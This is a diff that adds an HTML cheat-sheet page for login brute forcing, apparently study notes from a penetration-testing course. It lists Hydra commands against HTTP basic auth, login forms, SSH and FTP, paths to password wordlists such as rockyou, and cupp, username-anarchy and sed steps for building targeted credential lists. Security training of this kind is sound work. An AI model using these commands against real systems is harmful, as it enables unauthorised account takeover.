@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hydra and Wordlists</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="button-container">
+    <!-- Go Home Button -->
+    <a href="index.html" class="go-home-button">Go Home</a>
+</div>
+    
+        <h1>Login Brute Forcing</h1>
+
+        <h2>Hydra</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Command</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>hydra -h</code></td>
+                    <td>hydra help</td>
+                </tr>
+                <tr>
+                    <td><code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code></td>
+                    <td>Basic Auth Brute Force - Combined Wordlist</td>
+                </tr>
+                <tr>
+                    <td><code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code></td>
+                    <td>Basic Auth Brute Force - User/Pass Wordlists</td>
+                </tr>
+                <tr>
+                    <td><code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=&lt;form name='login'"</code></td>
+                    <td>Login Form Brute Force - Static User, Pass Wordlist</td>
+                </tr>
+                <tr>
+                    <td><code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code></td>
+                    <td>SSH Brute Force - User/Pass Wordlists</td>
+                </tr>
+                <tr>
+                    <td><code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code></td>
+                    <td>FTP Brute Force - Static User, Pass Wordlist</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2>Wordlists</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Command</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code></td>
+                    <td>Default Passwords Wordlist</td>
+                </tr>
+                <tr>
+                    <td><code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></td>
+                    <td>Common Passwords Wordlist</td>
+                </tr>
+                <tr>
+                    <td><code>/opt/useful/SecLists/Usernames/Names/names.txt</code></td>
+                    <td>Common Names Wordlist</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2>Misc</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Command</th>
+                    <th>Description</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>cupp -i</code></td>
+                    <td>Creating Custom Password Wordlist</td>
+                </tr>
+                <tr>
+                    <td><code>sed -ri '/^.{,7}$/d' william.txt</code></td>
+                    <td>Remove Passwords Shorter Than 8</td>
+                </tr>
+                <tr>
+                    <td><code>sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt</code></td>
+                    <td>Remove Passwords With No Special Chars</td>
+                </tr>
+                <tr>
+                    <td><code>sed -ri '/[0-9]+/!d' william.txt</code></td>
+                    <td>Remove Passwords With No Numbers</td>
+                </tr>
+                <tr>
+                    <td><code>./username-anarchy Bill Gates &gt; bill.txt</code></td>
+                    <td>Generate Usernames List</td>
+                </tr>
+                <tr>
+                    <td><code>ssh b.gates@SERVER_IP -p PORT</code></td>
+                    <td>SSH to Server</td>
+                </tr>
+                <tr>
+                    <td><code>ftp 127.0.0.1</code></td>
+                    <td>FTP to Server</td>
+                </tr>
+                <tr>
+                    <td><code>su - user</code></td>
+                    <td>Switch to User</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</body>
+</html>
